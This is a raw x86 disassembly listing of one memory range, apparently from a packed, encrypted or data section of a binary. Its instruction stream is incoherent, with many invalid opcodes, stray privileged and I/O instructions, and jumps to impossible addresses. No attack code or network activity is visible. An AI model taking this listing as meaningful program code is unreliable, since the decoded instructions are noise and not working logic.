  41e3cf:	rcpps  xmm1,XMMWORD PTR [ebx-0x5b]
  41e3d3:	std    
  41e3d4:	lods   eax,DWORD PTR ds:[esi]
  41e3d5:	add    eax,DWORD PTR [ebx]
  41e3d7:	scas   eax,DWORD PTR es:[edi]
  41e3d8:	pop    ebp
  41e3d9:	cli    
  41e3da:	scas   eax,DWORD PTR es:[edi]
  41e3db:	js     0x41e45c
  41e3dd:	jmp    0x5ff1da9d
  41e3e2:	jle    0x41e375
  41e3e4:	push   edx
  41e3e5:	fwait
  41e3e6:	jnp    0x41e3c4
  41e3e8:	jnp    0x41e42a
  41e3ea:	jge    0x41e416
  41e3ec:	pop    edi
  41e3ed:	mov    edx,0xb07f9f25
  41e3f2:	push   ds
  41e3f3:	aad    0xc5
  41e3f5:	sub    bl,BYTE PTR [eax-0x6c551af2]
  41e3fb:	pop    ebx
  41e3fc:	and    BYTE PTR [ecx],bh
  41e3fe:	int    0x7e
  41e400:	adc    BYTE PTR [edx-0x1],bh
  41e403:	das    
  41e404:	push   esp
  41e405:	aad    0xec
  41e407:	jb     0x41e43b
  41e409:	adc    cl,BYTE PTR gs:[eax-0x6b30b89d]
  41e410:	ins    DWORD PTR es:[edi],dx
  41e411:	adc    BYTE PTR [ebp-0x444c7465],cl
  41e417:	(bad)  
  41e418:	pop    ebx
  41e419:	in     al,dx
  41e41a:	test   bh,bh
  41e41c:	adc    al,0xae
  41e41e:	jb     0x41e3e9
  41e420:	mov    esi,0xc0cfe964
  41e425:	icebp  
  41e426:	cmp    ah,BYTE PTR [ebx+eax*1+0x47]
  41e42a:	ja     0x41e3d5
  41e42c:	hlt    
  41e42d:	add    edi,DWORD PTR [ebx+edx*8+0x353a661f]
  41e434:	xor    al,0x11
  41e436:	lea    ecx,[ebx-0x46]
  41e439:	loop   0x41e41c
  41e43b:	sub    al,bl
  41e43d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e43e:	jmp    0x3bbcea8a
  41e443:	add    DWORD PTR [ecx+0x2ad1128f],0xffffff97
  41e44a:	je     0x41e4b6
  41e44c:	mov    ah,BYTE PTR [edi+eiz*8-0x3e75f6e6]
  41e453:	rcr    DWORD PTR ds:0x4fec883e,cl
  41e459:	jecxz  0x41e421
  41e45b:	push   ebx
  41e45c:	xchg   esp,eax
  41e45d:	mov    edi,0x23c6f221
  41e462:	stc    
  41e463:	mov    bl,BYTE PTR [edi-0xa]
  41e466:	push   0x9e0d3f12
  41e46b:	inc    ebx
  41e46c:	mov    DWORD PTR [ebp+0x34],esi
  41e46f:	or     ah,0xab
  41e472:	lods   al,BYTE PTR ds:[esi]
  41e473:	mov    bh,0x2f
  41e475:	jecxz  0x41e49f
  41e477:	nop
  41e478:	retf   0xfa84
  41e47b:	lods   eax,DWORD PTR ds:[esi]
  41e47c:	cmp    bl,BYTE PTR [edx+0x50]
  41e47f:	rol    edi,cl
  41e481:	adc    al,0x8
  41e483:	fwait
  41e484:	xor    eax,0xd739de65
  41e489:	sub    eax,DWORD PTR [eax]
  41e48b:	scas   eax,DWORD PTR es:[edi]
  41e48c:	ins    DWORD PTR es:[edi],dx
  41e48d:	in     eax,dx
  41e48e:	or     BYTE PTR [esi-0x5d],cl
  41e491:	lahf   
  41e492:	push   edi
  41e493:	popa   
  41e494:	retf   0xf9b7
  41e497:	dec    edx
	...
  41e514:	inc    ecx
  41e515:	inc    BYTE PTR [ebx+eiz*1-0x1188441]
  41e51c:	push   ecx
  41e51d:	jecxz  0x41e544
  41e51f:	arpl   WORD PTR [ebx],di
  41e521:	rcl    BYTE PTR [edi+0x180353d],1
  41e527:	add    BYTE PTR [edi+eax*1+0x0],ch
  41e52b:	add    BYTE PTR [eax+0x2faf221e],cl
  41e531:	aam    0x23
  41e533:	push   cs
  41e534:	sub    edx,DWORD PTR [ebp-0x6614964d]
  41e53a:	gs mov cl,0xe5
  41e53d:	xor    DWORD PTR [ecx-0x7a901b97],ebx
  41e543:	sub    dh,0xb4
  41e546:	js     0x41e523
  41e548:	jns    0x41e53d
  41e54a:	or     BYTE PTR ds:0x5faa524c,dh
  41e550:	pop    ebx
  41e551:	test   edi,0x3a9d79d8
  41e557:	(bad)  
  41e558:	mov    ds:0x53dc31cc,eax
  41e55d:	and    eax,0x63eb3977
  41e562:	addr16 mov edx,0x4d9f1bd7
  41e568:	inc    edx
  41e569:	ret    
  41e56a:	ds js  0x41e531
  41e56d:	cmp    eax,0x2e00bf2
  41e572:	xor    al,0xc7
  41e574:	sub    eax,0x7c12c475
  41e579:	fcmovne st,st(2)
  41e57b:	push   edx
  41e57c:	and    eax,0xe3ee8006
  41e581:	aaa    
  41e582:	enter  0x3923,0xbd
  41e586:	(bad)  
  41e588:	lds    edi,FWORD PTR [edx+0x25]
  41e58b:	jle    0x41e601
  41e58d:	xchg   ebp,eax
  41e58e:	ja     0x41e5fa
  41e590:	shl    dl,0x67
  41e593:	fiadd  DWORD PTR [ebp-0x3f]
  41e596:	mov    esp,0xf797a119
  41e59b:	mov    ?,WORD PTR [esi+0xf]
  41e59e:	cdq    
  41e59f:	pop    esp
  41e5a0:	mov    eax,0xa58c8b65
  41e5a5:	(bad)  
  41e5a6:	frstor [edx+0x69]
  41e5a9:	rol    DWORD PTR [eax+0x46446f70],0xb7
  41e5b0:	data16 fild WORD PTR [ecx-0x5d]
  41e5b4:	sub    DWORD PTR [edi-0x2a],ecx
  41e5b7:	mov    cl,ah
  41e5b9:	stc    
  41e5ba:	pop    esp
  41e5bb:	sbb    eax,DWORD PTR [edi]
  41e5bd:	inc    edx
  41e5be:	dec    edi
  41e5bf:	and    esp,DWORD PTR [edx-0x6cad5ae8]
  41e5c5:	jbe    0x41e54a
  41e5c7:	cmp    ebp,DWORD PTR [ebx+0x40e556ef]
  41e5cd:	xor    DWORD PTR ds:[ecx],esi
  41e5d0:	inc    ecx
  41e5d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5d2:	scas   eax,DWORD PTR es:[edi]
  41e5d3:	out    0x9f,al
  41e5d5:	xor    ch,BYTE PTR [eax+0x2b]
  41e5d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5d9:	aas    
  41e5da:	je     0x41e562
  41e5dc:	dec    esi
  41e5dd:	mov    cl,0x8
  41e5df:	cld    
  41e5e0:	cmp    al,0x37
  41e5e2:	movhps xmm5,QWORD PTR [ecx+0x33470e8f]
  41e5e9:	cli    
  41e5ea:	cmp    al,0x11
  41e5ec:	lea    ecx,[edx]
  41e5ee:	popa   
  41e5ef:	push   0x6be1d129
  41e5f4:	outs   dx,BYTE PTR ds:[esi]
  41e5f5:	out    0x8a,eax
  41e5f7:	(bad)  
  41e5f8:	xor    bh,0xc0
  41e5fb:	lea    ecx,ds:0xc6b33c6e
  41e601:	pop    edi
  41e602:	pop    edi
  41e603:	adc    al,0xdd
  41e605:	add    eax,0xbb19c70e
  41e60a:	lods   eax,DWORD PTR ds:[esi]
  41e60b:	clc    
  41e60c:	sti    
  41e60d:	loop   0x41e64c
  41e60f:	pop    ss
  41e610:	jmp    0x41e596
  41e612:	inc    edi
  41e613:	(bad)  
  41e614:	lods   eax,DWORD PTR ds:[esi]
  41e615:	int    0x0
  41e617:	inc    ecx
  41e618:	fild   WORD PTR [esi+0x6f]
  41e61b:	xor    eax,0xd8867643
  41e620:	loop   0x41e5aa
  41e622:	mov    eax,ds:0x171ec006
  41e627:	(bad)  
  41e628:	dec    esp
  41e629:	fwait
  41e62a:	jecxz  0x41e67f
  41e62c:	cmc    
  41e62d:	sbb    BYTE PTR [ecx-0x7a6bcd3c],0x31
  41e634:	repz jne 0x41e6a1
  41e637:	pop    DWORD PTR [ecx+0x2bc1b87b]
  41e63d:	sbb    al,0xb8
  41e63f:	pop    es
  41e640:	dec    edx
  41e641:	pop    ds
  41e642:	cwde   
  41e643:	push   edx
  41e644:	std    
  41e645:	jecxz  0x41e681
  41e647:	add    BYTE PTR [eax+0x52],ch
  41e64a:	enter  0x7918,0x33
  41e64e:	gs push eax
  41e650:	ja     0x41e5eb
  41e652:	cmp    ebx,DWORD PTR [edi+0x4b9fb43c]
  41e658:	pushaw 
  41e65a:	mov    bh,0xc3
  41e65c:	sub    BYTE PTR [eax],cl
  41e65e:	dec    esi
  41e65f:	jl     0x41e5f9
  41e661:	pop    ebp
  41e662:	aaa    
  41e663:	ror    BYTE PTR [edi-0x5b0abba3],cl
  41e669:	mul    BYTE PTR [ecx+0x23]
  41e66c:	cs pop ss
  41e66e:	lahf   
  41e66f:	int3   
  41e670:	es icebp 
  41e672:	les    ebx,FWORD PTR [ecx]
  41e674:	lock mov ecx,es
  41e677:	xchg   esp,eax
  41e678:	popa   
  41e679:	mov    dh,0xf9
  41e67b:	lahf   
  41e67c:	fucomip st,st(1)
  41e67e:	lock or DWORD PTR [eax+ebx*2],ebx
  41e682:	bound  edi,QWORD PTR [ebp+ecx*8-0x25bb0653]
  41e689:	mov    ?,WORD PTR [ebx]
  41e68b:	jo     0x41e65c
  41e68d:	in     eax,dx
  41e68e:	jge    0x41e6b7
  41e690:	jne    0x41e6af
  41e692:	xor    al,0xd4
  41e694:	push   ss
  41e695:	dec    esp
  41e696:	pop    ss
  41e697:	outs   dx,BYTE PTR ds:[esi]
  41e698:	push   cs
  41e699:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e69a:	(bad)  ds:0x52c20c31
  41e6a0:	push   es
  41e6a1:	out    dx,al
  41e6a2:	addr16 aam 0xe7
  41e6a5:	cld    
  41e6a6:	popa   
  41e6a7:	mov    WORD PTR ds:0xb3a4a49,ds
  41e6ad:	push   ds
  41e6ae:	enter  0xa928,0x9f
  41e6b2:	push   ecx
  41e6b3:	xor    al,0xa0
  41e6b5:	adc    ebp,ebp
  41e6b7:	or     BYTE PTR [eax-0x12d09e68],ch
  41e6bd:	mov    edi,0xcb739d80
  41e6c2:	or     al,0x99
  41e6c4:	jo     0x41e720
  41e6c6:	push   edi
  41e6c7:	push   eax
  41e6c8:	clc    
  41e6c9:	out    0xbc,al
  41e6cb:	dec    ebx
  41e6cc:	test   al,0x8
  41e6ce:	jg     0x41e6a9
  41e6d0:	pop    es
  41e6d1:	push   ebx
  41e6d2:	cs lock sbb eax,0xa547c8b
  41e6d9:	mov    dh,0xf7
  41e6db:	jno    0x41e743
  41e6dd:	out    0x5e,eax
  41e6df:	mov    esi,0x7091c60c
  41e6e4:	imul   esp,ebx,0xe727c7e2
  41e6ea:	repnz or eax,0x9881d57a
  41e6f0:	ins    DWORD PTR es:[edi],dx
  41e6f1:	cmc    
  41e6f2:	cdq    
  41e6f3:	rcr    DWORD PTR [edi-0x2f],0x6
  41e6f7:	ret    
  41e6f8:	ret    0x5550
  41e6fb:	pop    ss
  41e6fc:	cmc    
  41e6fd:	add    eax,0x2c8ef051
  41e702:	jmp    0xca443e74
  41e707:	out    dx,al
  41e708:	sub    ebp,edi
  41e70a:	dec    esi
  41e70b:	into   
  41e70c:	xchg   edx,eax
  41e70d:	(bad)  
  41e70e:	aam    0x33
  41e710:	and    BYTE PTR ds:0x69de188d,al
  41e716:	adc    eax,0xd910337
  41e71b:	mov    ds:0xa562ea19,al
  41e720:	add    ch,BYTE PTR [ebx+0x34]
  41e723:	stos   DWORD PTR es:[edi],eax
  41e724:	cdq    
  41e725:	inc    ecx
  41e726:	cdq    
  41e727:	(bad)  [ebp-0x38]
  41e72a:	lods   al,BYTE PTR ds:[esi]
  41e72b:	mov    cl,0xe5
  41e72d:	xor    ch,BYTE PTR [edi+0x36]
  41e730:	mov    cl,0x0
  41e732:	icebp  
  41e733:	stos   DWORD PTR es:[edi],eax
  41e734:	sbb    BYTE PTR [ebp+0x2a83a56c],dl
  41e73a:	push   ecx
  41e73b:	clc    
  41e73c:	stc    
  41e73d:	loope  0x41e6e6
  41e73f:	and    ch,BYTE PTR [ebp+0x54]
  41e742:	push   eax
  41e743:	jecxz  0x41e706
  41e745:	data16 sub al,0x78
  41e748:	fst    DWORD PTR [edi+0x2eabab45]
  41e74e:	jne    0x41e7c3
  41e750:	or     cl,bh
  41e752:	mul    DWORD PTR [edx+ebx*2-0x1]
  41e756:	dec    esp
  41e757:	sti    
  41e758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e759:	out    0x4d,eax
  41e75b:	dec    edx
  41e75c:	fild   WORD PTR [esi+0x77]
  41e75f:	int    0x41
  41e761:	jg     0x41e782
  41e763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e764:	test   DWORD PTR ds:0x119439cd,ecx
  41e76a:	inc    esi
  41e76b:	xchg   ebx,eax
  41e76c:	or     DWORD PTR [ebx-0x52fdf4a0],esi
  41e772:	xchg   ebx,eax
  41e773:	cmp    eax,0xd0a1adac
  41e778:	mov    edx,0x9b44a1b8
  41e77d:	fstp   TBYTE PTR [edx+ebx*8]
  41e780:	stos   DWORD PTR es:[edi],eax
  41e781:	mov    al,BYTE PTR [ebx+0x7a841455]
  41e787:	mov    esp,0xc4b23fce
  41e78c:	jp     0x41e79d
  41e78e:	xchg   edi,eax
  41e78f:	pushf  
  41e790:	(bad)  
  41e791:	push   cs
  41e792:	retf   0xf5f4
  41e795:	sbb    DWORD PTR [edx+0x1c99a189],esp
  41e79b:	out    dx,al
  41e79c:	cs xor ebx,esp
  41e79f:	in     al,dx
  41e7a0:	fmul   DWORD PTR [edi+0x1b]
  41e7a3:	sar    ecx,cl
  41e7a5:	xchg   edx,eax
  41e7a6:	jns    0x41e79e
  41e7a8:	repz sub ecx,DWORD PTR [ebx+esi*2-0x42]
  41e7ad:	lods   eax,DWORD PTR ds:[esi]
  41e7ae:	fisttp DWORD PTR cs:[edi+0x3b]
  41e7b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7b3:	lahf   
  41e7b4:	jecxz  0x41e762
  41e7b6:	ins    BYTE PTR es:[edi],dx
  41e7b7:	sar    BYTE PTR [edx],0x58
  41e7ba:	add    eax,0xf8f2c69a
  41e7bf:	aad    0xd3
  41e7c1:	jg     0x41e765
  41e7c3:	jne    0x41e79a
  41e7c5:	jg     0x41e838
  41e7c7:	and    eax,DWORD PTR [edx+0x71ceff53]
  41e7cd:	div    ebp
  41e7cf:	mov    DWORD PTR [eax+0x4b439438],ebp
  41e7d5:	test   al,0xfe
  41e7d7:	jb     0x41e846
  41e7d9:	push   0x1c
  41e7db:	cdq    
  41e7dc:	and    DWORD PTR [ecx+0x315c20f9],edx
  41e7e2:	mov    ch,0xc8
  41e7e4:	jns    0x41e7be
  41e7e6:	push   0xffffff90
  41e7e8:	not    eax
  41e7ea:	stc    
  41e7eb:	sub    DWORD PTR [esi],0xffffffb8
  41e7ee:	push   ecx
  41e7ef:	pop    ds
  41e7f0:	fmul   st,st(0)
  41e7f2:	adc    al,0xfd
  41e7f4:	lods   eax,DWORD PTR ds:[esi]
  41e7f5:	add    al,0x5a
  41e7f7:	in     al,dx
  41e7f8:	push   ss
  41e7f9:	cmp    dh,bl
  41e7fb:	sti    
  41e7fc:	and    al,BYTE PTR ds:0x11eb8638
  41e802:	shl    ebx,0x6
  41e805:	fldcw  WORD PTR [esi+0x79229c75]
  41e80b:	mov    gs,WORD PTR [edi]
  41e80d:	pop    esp
  41e80e:	loopne 0x41e839
  41e810:	pop    esi
  41e811:	popa   
  41e812:	pop    edi
  41e813:	pop    es
  41e814:	iret   
  41e815:	lds    esp,FWORD PTR [edi+0x13]
  41e818:	nop
  41e819:	cdq    
  41e81a:	mov    edx,0x46fb3f81
  41e81f:	cmp    al,0x65
  41e821:	xchg   ebx,eax
  41e822:	add    eax,0x585a583b
  41e827:	push   ebx
  41e828:	shl    BYTE PTR [edi-0x17eac9ae],cl
  41e82e:	loope  0x41e80b
  41e830:	xchg   esi,eax
  41e831:	shr    BYTE PTR [esi+0x484cdb8b],1
  41e837:	mov    DWORD PTR [ebp-0x5c],ebx
  41e83a:	sbb    al,0x8
  41e83c:	ins    BYTE PTR es:[edi],dx
  41e83d:	aaa    
  41e83e:	out    0x21,al
  41e840:	jmp    0x6c86:0x72ba2983
  41e847:	push   ecx
  41e848:	loopne 0x41e8c6
  41e84a:	cmp    DWORD PTR [ebx-0x4f],ebx
  41e84d:	lahf   
  41e84e:	xchg   ebp,eax
  41e84f:	cmp    al,0xa3
  41e851:	mov    eax,ds:0xb8d9d1a2
  41e856:	(bad)  [ebx]
  41e858:	(bad)  
  41e859:	shl    BYTE PTR [ebp+0x57],cl
  41e85c:	jne    0x41e82e
  41e85e:	push   ds
  41e85f:	retf   0xa7e1
  41e862:	je     0x41e888
  41e864:	mov    BYTE PTR [ebx+0x64c097e6],dl
  41e86a:	push   0x4e6fb51f
  41e86f:	jp     0x41e8bb
  41e871:	stos   BYTE PTR es:[edi],al
  41e872:	xor    esp,DWORD PTR [ecx+edi*1]
  41e875:	xor    BYTE PTR [esi],0x74
  41e878:	mov    al,ds:0xf0dbf698
  41e87d:	sub    edx,edx
  41e87f:	xor    DWORD PTR [ecx+0x710a6fa1],0x25
  41e886:	(bad)  
  41e887:	ins    BYTE PTR es:[edi],dx
  41e888:	pop    edx
  41e889:	mov    ch,0xe
  41e88b:	mov    ds:0xd36e112c,al
  41e890:	popf   
  41e891:	nop
  41e892:	loopne 0x41e839
  41e894:	js     0x41e869
  41e896:	into   
  41e897:	jmp    0x8968421c
  41e89c:	mov    ds:0x92cd694a,eax
  41e8a1:	cmp    ah,al
  41e8a3:	push   edx
  41e8a4:	sbb    DWORD PTR [ecx],esi
  41e8a6:	adc    bl,BYTE PTR [edi]
  41e8a8:	sar    DWORD PTR [edi+0x5a],cl
  41e8ab:	outs   dx,DWORD PTR ds:[esi]
  41e8ac:	xor    ecx,DWORD PTR [edi]
  41e8ae:	sbb    al,0x1
  41e8b0:	xchg   BYTE PTR [esp+eax*2+0x46],ch
  41e8b4:	sub    DWORD PTR [ecx-0x75],ecx
  41e8b7:	inc    esi
  41e8b8:	test   edi,edi
  41e8ba:	jmp    0x41e871
  41e8bc:	jge    0x41e841
  41e8be:	jo     0x41e8d6
  41e8c0:	ret    0xdc16
  41e8c3:	(bad)  
  41e8c4:	ret    
  41e8c5:	shl    BYTE PTR [esi-0xa9ca09b],0x9e
  41e8cc:	ror    ch,cl
  41e8ce:	cwde   
  41e8cf:	repnz push esi
  41e8d1:	cmp    esi,DWORD PTR [edi-0x74]
  41e8d4:	test   DWORD PTR [eax-0x10],edi
  41e8d7:	leave  
  41e8d8:	push   esi
  41e8d9:	cmp    eax,0xf80117f5
  41e8de:	and    DWORD PTR [ebp-0x21],edi
  41e8e1:	cwde   
  41e8e2:	push   cs
  41e8e3:	sub    BYTE PTR [edi],ch
  41e8e5:	sar    BYTE PTR [esi+0x1c],0x97
  41e8e9:	mov    edi,0x1a37cdfb
  41e8ee:	clc    
  41e8ef:	out    0x7a,al
  41e8f1:	and    DWORD PTR [ebp-0x4d171053],0x1f
  41e8f8:	and    ah,ch
  41e8fa:	and    al,0x8
  41e8fc:	out    dx,al
  41e8fd:	push   eax
  41e8fe:	aaa    
  41e8ff:	push   es
  41e900:	mov    bh,0x4b
  41e902:	push   ds
  41e903:	mov    ebx,0x6779ed95
  41e908:	jecxz  0x41e969
  41e90a:	mov    cs,WORD PTR [edi-0x35566087]
  41e910:	push   esi
  41e911:	push   ebp
  41e912:	dec    esp
  41e913:	jne    0x41e93c
  41e915:	pop    ss
  41e916:	stc    
  41e917:	ret    
  41e918:	mov    al,ds:0x44e29a54
  41e91d:	jmp    0x104e:0xfd24efde
  41e924:	push   ss
  41e925:	cwde   
  41e926:	daa    
  41e927:	enter  0xf375,0x59
  41e92b:	es xchg ebx,eax
  41e92d:	std    
  41e92e:	sahf   
  41e92f:	cmp    edi,ebx
  41e931:	nop
  41e932:	cmp    al,BYTE PTR [eax+0x754c368a]
  41e938:	test   DWORD PTR [ebx+0x9],ebx
  41e93b:	sub    eax,0xe9496221
  41e940:	push   es
  41e941:	cmp    ah,BYTE PTR [ebx-0x32]
  41e944:	lods   eax,DWORD PTR ds:[esi]
  41e945:	and    DWORD PTR [ecx-0x2],eax
  41e948:	sub    ebp,DWORD PTR [edx+0x58]
  41e94b:	int    0x33
  41e94d:	pop    eax
  41e94e:	dec    ebp
  41e94f:	or     BYTE PTR [esi+ebx*8+0x15],dl
  41e953:	mov    ebx,0x2ab8a628
  41e958:	mov    WORD PTR es:[eax],cs
  41e95b:	ds mov edi,0x85850e7e
  41e961:	jne    0x41e911
  41e963:	jecxz  0x41e92e
  41e965:	hlt    
  41e966:	js     0x41e987
  41e968:	jno    0x41e9bf
  41e96a:	lods   eax,DWORD PTR ds:[esi]
  41e96b:	outs   dx,DWORD PTR ds:[esi]
  41e96c:	aam    0xad
  41e96e:	xchg   edx,eax
  41e96f:	out    dx,al
  41e970:	inc    esp
  41e971:	inc    edi
  41e972:	add    eax,0x8c0e5d2d
  41e977:	xchg   esp,eax
  41e978:	mov    eax,ds:0x9e251c64
  41e97d:	call   0x68eb:0x8369b279
  41e984:	xlat   BYTE PTR ds:[ebx]
  41e985:	mov    ecx,0x5d90fea7
  41e98a:	cmp    edi,eax
  41e98c:	(bad)  
  41e98d:	xor    al,0x8f
  41e98f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e990:	jnp    0x41e9be
  41e992:	test   BYTE PTR [ecx],dh
  41e994:	shl    DWORD PTR ds:0x28e803f5,0xa
  41e99b:	daa    
  41e99c:	mov    al,0x53
  41e99e:	popa   
  41e99f:	jns    0x41e9e0
  41e9a1:	push   edi
  41e9a2:	(bad)  
  41e9a3:	outs   dx,DWORD PTR ds:[esi]
  41e9a4:	pop    ebx
  41e9a5:	cmp    dh,BYTE PTR [edi-0x3f]
  41e9a8:	in     eax,dx
  41e9a9:	adc    dl,ch
  41e9ab:	or     eax,0xb505c62b
  41e9b0:	xchg   edi,eax
  41e9b1:	inc    ebx
  41e9b2:	sub    DWORD PTR [ecx+0x6],ecx
  41e9b5:	(bad)  
  41e9b6:	cli    
  41e9b7:	mov    cs,WORD PTR [edi-0x75ca3710]
  41e9bd:	fdiv   QWORD PTR [ecx+0x7]
  41e9c0:	pop    ebp
  41e9c1:	sti    
  41e9c2:	(bad)  
  41e9c5:	clc    
  41e9c6:	dec    eax
  41e9c7:	into   
  41e9c8:	jmp    0x97bc:0x26aaa16d
  41e9cf:	in     eax,dx
  41e9d0:	sar    DWORD PTR [ecx+0x78ac8e25],cl
  41e9d6:	jecxz  0x41e9cd
  41e9d8:	mov    WORD PTR [edi+0x57acd968],?
  41e9de:	sbb    eax,0x90a42bc1
  41e9e3:	mov    cl,0xd4
  41e9e5:	sbb    al,0x3c
  41e9e7:	pop    ss
  41e9e8:	cmp    dh,dh
  41e9ea:	rol    BYTE PTR [edi],cl
  41e9ec:	lock mov eax,0x23957e12
  41e9f2:	std    
  41e9f3:	imul   edx,esp,0xbda082de
  41e9f9:	and    edi,DWORD PTR [edi-0x31]
  41e9fc:	add    al,0x59
  41e9fe:	cli    
  41e9ff:	push   ebx
  41ea00:	mov    ebx,0x93c12076
  41ea05:	mov    al,0x67
  41ea07:	cld    
  41ea08:	xchg   ebp,eax
  41ea09:	(bad)  
  41ea0a:	sti    
  41ea0b:	jo     0x41ea8a
  41ea0d:	sub    cl,dl
  41ea0f:	pop    ebp
  41ea10:	xlat   BYTE PTR ds:[ebx]
  41ea11:	xor    dl,al
  41ea13:	stos   BYTE PTR es:[edi],al
  41ea14:	mov    ebx,DWORD PTR [ecx-0x5f]
  41ea17:	jecxz  0x41ea62
  41ea19:	das    
  41ea1a:	pushf  
  41ea1b:	call   0x35228cd6
  41ea20:	mov    esp,0xc5a10faf
  41ea25:	dec    ebx
  41ea26:	xor    BYTE PTR [edi+edx*2+0x28],ch
  41ea2a:	sar    edx,0xc4
  41ea2d:	lea    ecx,[edx+0x572921c3]
  41ea33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea34:	pop    es
  41ea35:	adc    eax,0x62551ea2
  41ea3a:	mov    WORD PTR [edx+0x79],ds
  41ea3d:	in     eax,0x36
  41ea3f:	mov    ds:0x35135c3c,eax
  41ea44:	fisttp QWORD PTR [eax-0x57]
  41ea47:	pop    edx
  41ea48:	rcl    edx,cl
  41ea4a:	inc    eax
  41ea4b:	cmp    BYTE PTR ds:0xdd6081bc,al
  41ea51:	gs es dec edx
  41ea54:	out    0xee,al
  41ea56:	mov    eax,ds:0x3c0e3f27
  41ea5b:	mov    DWORD PTR [edx+0x20],ecx
  41ea5e:	push   ebx
  41ea5f:	pop    esp
  41ea60:	iret   
  41ea61:	cmp    BYTE PTR [ecx+0x2e375050],al
  41ea67:	mov    esp,0xb4c2c23b
  41ea6c:	mov    eax,ds:0x1a3e22e2
  41ea71:	xor    eax,0x115a328f
  41ea76:	hlt    
  41ea77:	and    BYTE PTR [ebp-0x1726058e],dh
  41ea7d:	or     al,BYTE PTR [eax]
  41ea7f:	aas    
  41ea80:	xchg   esi,eax
  41ea81:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41ea83:	iret   
  41ea84:	or     eax,0x8b41090a
  41ea89:	add    BYTE PTR [ecx],0x16
  41ea8c:	shl    dh,cl
  41ea8e:	xor    DWORD PTR [ebp+0x4d],esp
  41ea91:	jg     0x41eaf1
  41ea93:	dec    ebx
  41ea94:	xor    BYTE PTR [ebx-0x44],dl
  41ea97:	les    esp,FWORD PTR [edi]
  41ea99:	jge    0x41ea2f
  41ea9b:	sbb    esi,0xffffffce
  41ea9e:	jno    0x41ea81
  41eaa0:	add    BYTE PTR [edi-0x2f],0xe1
  41eaa4:	sub    ah,BYTE PTR [ecx+0x4b81ac8f]
  41eaaa:	xor    dh,BYTE PTR [ebx]
  41eaac:	in     eax,0xb4
  41eaae:	repnz cdq 
  41eab0:	mul    DWORD PTR [edi+0x70]
  41eab3:	cmp    ah,BYTE PTR [eax+0x1c06c8c8]
  41eab9:	retf   
  41eaba:	lds    edi,FWORD PTR ds:0x14955eb1
  41eac0:	add    esi,ebp
  41eac2:	arpl   WORD PTR [esi+eiz*4+0xa],di
  41eac6:	cmp    BYTE PTR [ebx],bl
  41eac8:	jmp    0x73cb:0x87a0ca4
  41eacf:	lods   al,BYTE PTR ds:[esi]
  41ead0:	mov    ecx,0x19c05a95
  41ead5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ead6:	xchg   bl,cl
  41ead8:	sub    BYTE PTR [esi-0x4ef34a14],dh
  41eade:	mov    ebp,0x5867243d
  41eae3:	cmp    esp,DWORD PTR [ebx+edx*8-0x1d929bc1]
  41eaea:	lds    esi,FWORD PTR [edi+0x3]
  41eaed:	fdivr  QWORD PTR [ebx-0x3c46a6ec]
  41eaf3:	cmp    edi,ebp
  41eaf5:	dec    edi
  41eaf6:	mov    cl,0x73
  41eaf8:	pop    edi
  41eaf9:	imul   esi,DWORD PTR [eax+0x69b1dde9],0x39b2647d
  41eb03:	adc    eax,0xae152dcc
  41eb08:	pop    esp
  41eb09:	ret    
  41eb0a:	std    
  41eb0b:	scas   eax,DWORD PTR es:[edi]
  41eb0c:	daa    
  41eb0d:	outs   dx,DWORD PTR ds:[esi]
  41eb0e:	inc    esi
  41eb0f:	ins    DWORD PTR es:[edi],dx
  41eb10:	mov    ecx,0xfaeae1b9
  41eb15:	scas   al,BYTE PTR es:[edi]
  41eb16:	jg     0x41eb80
  41eb18:	retf   
  41eb19:	pushf  
  41eb1a:	add    al,0xb3
  41eb1c:	sar    BYTE PTR [eax+0xa313ae],cl
  41eb22:	and    eax,0xf1f50bab
  41eb27:	lods   al,BYTE PTR ds:[esi]
  41eb28:	ins    BYTE PTR es:[edi],dx
  41eb29:	cmc    
  41eb2a:	(bad)
  41eb2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb2e:	shl    DWORD PTR [ebx+ebp*2+0x4d02c5bd],0x42
  41eb36:	js     0x41eb02
  41eb38:	inc    edx
  41eb39:	outs   dx,DWORD PTR ds:[esi]
  41eb3a:	pop    esi
  41eb3b:	cmp    al,0x3a
  41eb3d:	push   esp
  41eb3e:	pusha  
  41eb3f:	jp     0x41eaef
  41eb41:	push   ss
  41eb42:	sub    al,0x30
  41eb44:	popf   
  41eb45:	es cs jge 0x41eb80
  41eb49:	mov    ebx,0x33cb6760
  41eb4e:	repnz dec edi
  41eb50:	mov    ds:0xef536ed7,eax
  41eb55:	js     0x41eaed
  41eb57:	je     0x41eb63
  41eb59:	pusha  
  41eb5a:	xchg   BYTE PTR [ecx],al
  41eb5c:	sar    BYTE PTR [esi+0x4eea9b08],0xc7
  41eb63:	out    dx,al
  41eb64:	(bad)  
  41eb65:	aaa    
  41eb66:	mov    esp,0x5e028a37
  41eb6b:	jns    0x41eb50
  41eb6d:	loopne 0x41eb4c
  41eb6f:	les    eax,FWORD PTR [esi]
  41eb71:	(bad)  
  41eb72:	jno    0x41eb3d
  41eb74:	mov    esi,DWORD PTR [esi-0x2bfb5d0b]
  41eb7a:	push   esi
  41eb7b:	push   es
  41eb7c:	jne    0x41eb22
  41eb7e:	mov    al,0xdd
  41eb80:	pop    edi
  41eb81:	sub    ch,BYTE PTR [edi]
  41eb83:	adc    cl,cl
  41eb85:	pop    ds
  41eb86:	and    BYTE PTR [edx+0x57],bl
  41eb89:	rol    BYTE PTR [eax+0x6d012edc],cl
  41eb8f:	pop    ecx
  41eb90:	daa    
  41eb91:	sti    
  41eb92:	stc    
  41eb93:	xchg   esi,eax
  41eb94:	jb     0x41ebbf
  41eb96:	les    edx,FWORD PTR gs:[ebx-0x5c7f5ea0]
  41eb9d:	push   0x39c675f8
